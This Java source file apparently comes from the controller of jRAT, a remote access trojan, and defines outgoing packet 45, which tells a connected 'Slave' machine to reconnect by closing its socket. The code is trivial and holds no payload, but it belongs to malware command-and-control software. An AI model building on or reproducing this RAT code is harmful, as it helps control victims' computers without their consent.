package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import jrat.controller.exceptions.CloseException;


public class Packet45Reconnect implements OutgoingPacket {

	@Override
	public void write(Slave slave) throws Exception {
		slave.closeSocket(new CloseException("Reconnecting"));
	}

	@Override
	public short getPacketId() {
		return 45;
	}

}
